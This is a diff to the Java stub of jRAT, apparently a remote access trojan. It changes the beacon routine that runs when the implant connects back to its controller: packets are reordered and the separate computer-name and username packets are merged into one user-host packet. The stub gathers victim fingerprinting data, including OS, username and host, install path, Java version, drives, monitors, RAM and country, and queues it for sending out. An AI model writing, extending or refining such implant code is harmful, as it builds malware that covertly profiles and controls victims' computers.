@@ -24,16 +24,13 @@ import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.crypto.KeyExchanger;
 import se.jrat.common.io.StringWriter;
-import se.jrat.common.utils.UserUtils;
 import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
 import se.jrat.stub.packets.outgoing.Packet13Status;
-import se.jrat.stub.packets.outgoing.Packet14InitComputerName;
 import se.jrat.stub.packets.outgoing.Packet15InitServerID;
 import se.jrat.stub.packets.outgoing.Packet16InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
-import se.jrat.stub.packets.outgoing.Packet22InitUsername;
 import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
@@ -42,6 +39,7 @@ import se.jrat.stub.packets.outgoing.Packet30InitVersion;
 import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
 import se.jrat.stub.packets.outgoing.Packet47InitCountry;
+import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
 import se.jrat.stub.packets.outgoing.Packet63InitRAM;
@@ -147,20 +145,17 @@ public class Connection implements Runnable {
 	}
 
 	public static void initialize() throws Exception {
-		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
-		
 		addToSendQueue(new Packet1InitHandshake());
-
-		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
+		
+		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
 
 		addToSendQueue(new Packet16InitOperatingSystem());
-		
-		String computerName = UserUtils.getHostname();
-		addToSendQueue(new Packet14InitComputerName(computerName));
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
-		addToSendQueue(new Packet22InitUsername(System.getProperty("user.name")));
+		addToSendQueue(new Packet5InitUserHost());
+				
+		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
 		addToSendQueue(new Packet23InitInstallPath(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));
 
